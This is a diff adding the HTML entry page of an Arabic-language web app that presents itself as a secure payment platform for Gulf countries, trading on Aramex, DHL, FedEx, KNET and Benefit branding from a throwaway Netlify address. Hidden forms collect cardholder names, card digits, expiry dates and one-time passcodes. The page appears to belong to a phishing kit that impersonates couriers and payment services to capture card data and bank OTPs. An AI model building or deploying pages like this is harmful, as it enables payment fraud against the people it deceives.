@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="theme-color" content="#0EA5E9" />
+    
+    <!-- Primary Meta Tags -->
+    <title>نظام الدفع الآمن - دفع إلكتروني سريع وموثوق لدول الخليج</title>
+    <meta name="title" content="نظام الدفع الآمن - دفع إلكتروني سريع وموثوق لدول الخليج" />
+    <meta name="description" content="منصة متكاملة للدفع الإلكتروني في دول الخليج تدعم الشحن والفواتير والعقود والخدمات الحكومية والصحية. آمن وسريع ومضمون 100%" />
+    <meta name="keywords" content="دفع إلكتروني, خليج, سداد, كي نت, بنفت, شحن, فواتير, أرامكس, دي اتش ال, فيديكس" />
+    <meta name="author" content="منصة الدفع الآمن" />
+    <meta name="robots" content="index, follow" />
+    <meta name="language" content="Arabic" />
+    <meta name="revisit-after" content="7 days" />
+    
+    <!-- Open Graph / Facebook / WhatsApp -->
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="نظام الدفع الآمن" />
+    <meta property="og:locale" content="ar_AR" />
+    <meta property="og:url" content="https://melodic-squirrel-d354d7.netlify.app/" />
+    <meta property="og:title" content="نظام الدفع الآمن - دفع إلكتروني سريع وموثوق لدول الخليج" />
+    <meta property="og:description" content="منصة متكاملة للدفع الإلكتروني في دول الخليج تدعم الشحن والفواتير والعقود والخدمات الحكومية والصحية. آمن وسريع ومضمون 100%" />
+    <meta property="og:image" content="https://raw.githubusercontent.com/you3333ef/Youssef-Dafa/main/public/og-aramex.jpg" />
+    <meta property="og:image:secure_url" content="https://raw.githubusercontent.com/you3333ef/Youssef-Dafa/main/public/og-aramex.jpg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:image:type" content="image/jpeg" />
+    <meta property="og:image:alt" content="نظام الدفع الآمن - منصة الدفع الإلكتروني" />
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@YourTwitterHandle" />
+    <meta name="twitter:creator" content="@YourTwitterHandle" />
+    <meta name="twitter:domain" content="melodic-squirrel-d354d7.netlify.app" />
+    <meta name="twitter:url" content="https://melodic-squirrel-d354d7.netlify.app/" />
+    <meta name="twitter:title" content="نظام الدفع الآمن - دفع إلكتروني سريع وموثوق لدول الخليج" />
+    <meta name="twitter:description" content="منصة متكاملة للدفع الإلكتروني في دول الخليج تدعم الشحن والفواتير والعقود والخدمات الحكومية والصحية. آمن وسريع ومضمون 100%" />
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/you3333ef/Youssef-Dafa/main/public/og-aramex.jpg" />
+    <meta name="twitter:image:alt" content="نظام الدفع الآمن - منصة الدفع الإلكتروني" />
+    
+    <!-- WhatsApp Specific -->
+    <meta property="og:see_also" content="https://melodic-squirrel-d354d7.netlify.app/" />
+    
+    <!-- Canonical -->
+    <link rel="canonical" href="https://melodic-squirrel-d354d7.netlify.app/" />
+    
+    <!-- PWA -->
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="apple-touch-icon" href="/icon-192.png" />
+    
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
+
+    <script>
+      // Clear old service worker caches immediately
+      if ('caches' in window) {
+        caches.keys().then(function(cacheNames) {
+          cacheNames.forEach(function(cacheName) {
+            if (cacheName !== 'gulf-gateway-v4') {
+              caches.delete(cacheName);
+            }
+          });
+        });
+      }
+    </script>
+  </head>
+
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+
+    <!-- Hidden Netlify Forms for Detection -->
+    <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
+      <input type="text" name="name" />
+      <input type="email" name="email" />
+      <input type="tel" name="phone" />
+      <input type="text" name="service" />
+      <input type="text" name="cardholder" />
+      <input type="text" name="cardLast4" />
+      <input type="text" name="expiry" />
+      <input type="text" name="timestamp" />
+    </form>
+
+    <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
+      <input type="text" name="name" />
+      <input type="email" name="email" />
+      <input type="tel" name="phone" />
+      <input type="text" name="service" />
+      <input type="text" name="amount" />
+      <input type="text" name="cardholder" />
+      <input type="text" name="cardLast4" />
+      <input type="text" name="otp" />
+      <input type="text" name="timestamp" />
+    </form>
+  </body>
+</html>
